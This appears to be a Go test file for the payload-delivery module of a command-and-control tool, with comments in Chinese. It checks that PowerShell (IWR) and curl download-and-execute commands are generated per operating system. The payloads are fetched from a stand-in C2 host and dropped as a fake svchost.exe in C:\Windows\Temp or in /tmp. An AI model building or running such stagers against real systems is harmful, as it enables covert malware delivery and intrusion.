package delivery

import (
	"strings"
	"testing"
)

func countOS(items []CommandItem, os string) int {
	n := 0
	for _, it := range items {
		if it.OS == os {
			n++
		}
	}
	return n
}

func findByName(items []CommandItem, name string) (CommandItem, bool) {
	for _, it := range items {
		if it.Name == name {
			return it, true
		}
	}
	return CommandItem{}, false
}

// TestGenerateCommandsSeparatesOS Windows 投递必须只出 Windows 命令，
// Linux 投递必须只出 Linux 命令 —— 两者不能混在一起，也不能退化成同一套。
func TestGenerateCommandsSeparatesOS(t *testing.T) {
	win := GenerateCommands(CommandOptions{
		FullURL:      "http://c2.example.com/full/svchost.exe",
		OS:           "windows",
		SaveFilename: "svchost.exe",
		DownloadPath: `C:\Windows\Temp`,
	})
	if countOS(win, "windows") < 4 {
		t.Fatalf("Windows 投递应至少生成 4 条 Windows 命令，实际 %d 条：%+v", countOS(win, "windows"), win)
	}
	if countOS(win, "linux") != 0 {
		t.Fatalf("Windows 投递不应出现 Linux 命令：%+v", win)
	}
	ps, ok := findByName(win, "PowerShell 下载执行")
	if !ok || !strings.Contains(ps.Code, "IWR") || !strings.Contains(ps.Code, `C:\Windows\Temp\svchost.exe`) {
		t.Fatalf("PowerShell 命令不符合 Windows 路径：%+v", ps)
	}

	lin := GenerateCommands(CommandOptions{
		FullURL: "http://c2.example.com/full/update",
		OS:      "linux",
	})
	if countOS(lin, "linux") < 4 {
		t.Fatalf("Linux 投递应至少生成 4 条 Linux 命令，实际 %d 条：%+v", countOS(lin, "linux"), lin)
	}
	if countOS(lin, "windows") != 0 {
		t.Fatalf("Linux 投递不应出现 Windows 命令：%+v", lin)
	}
	curl, ok := findByName(lin, "curl 下载执行")
	if !ok || !strings.Contains(curl.Code, "/tmp/update") {
		t.Fatalf("curl 命令不符合 Linux 路径：%+v", curl)
	}
}

// TestGenerateCommandsOSCaseInsensitive 记录里存 "Windows"（大写）时也必须
// 走 Windows 分支并使用 Windows 默认路径，不能套用 /tmp。
func TestGenerateCommandsOSCaseInsensitive(t *testing.T) {
	items := GenerateCommands(CommandOptions{
		FullURL: "http://c2.example.com/full/update.exe",
		OS:      "Windows",
	})
	if countOS(items, "windows") < 4 {
		t.Fatalf("OS=Windows 应识别为 Windows，实际命令：%+v", items)
	}
	ps, ok := findByName(items, "PowerShell 下载执行")
	if !ok {
		t.Fatalf("缺少 PowerShell 命令：%+v", items)
	}
	if !strings.Contains(ps.Code, `C:\Windows\Temp\update.exe`) {
		t.Fatalf("大写 Windows 仍应使用 Windows 默认路径，实际：%s", ps.Code)
	}
	if strings.Contains(ps.Code, "/tmp/") {
		t.Fatalf("大写 Windows 不应套用 Linux 路径：%s", ps.Code)
	}
}
